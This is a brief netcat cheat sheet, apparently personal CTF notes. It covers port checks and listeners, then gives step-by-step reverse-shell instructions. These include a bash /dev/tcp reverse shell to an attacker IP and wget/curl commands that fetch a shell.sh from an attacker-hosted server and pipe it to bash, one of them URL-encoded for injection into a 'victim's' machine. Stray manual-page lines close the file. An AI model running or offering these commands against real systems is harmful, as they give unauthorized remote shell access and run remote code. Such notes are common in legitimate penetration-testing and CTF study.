# [Connection] Netcat

## Check target port avaiable
```bash
nc -nv 192.168.0.12 8080

nc -nv -w 3 192.168.0.12 8080 # Faster die time if target not open
```

## Check connections
```bash
nc jupiter.challenges.picoctf.org 64287
```

## Open current port
```bash
nc -lvnp 8080
```

## Perform Reverse Shell
https://www.revshells.com/

1. In your machine, run the nc listener, assume you are open port `8080`
```bash
nc -lvnp 8080
```

2. In victims machine, run the target code and done
```bash
sh -i >& /dev/tcp/192.168.80.105/8080 0>&1
```

3. (Optional) In case, you may use `python` or npm `serve` to host a simple web server
```bash 
python3 -m http.server 8080

serve -p 8080
```

4. (Optional) In victim machine, use `wget`, `curl` or `Invoke-WebRequest`
```bash
wget http://172.31.206.223:8080/shell.sh
curl http://172.31.206.223:8080/shell.sh

curl%20http://172.31.206.223:8080/shell.sh|bash

Invoke-WebRequest http://172.31.206.223:8080/shell.sh -OutFile shell.sh | bash shell.sh
```

port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
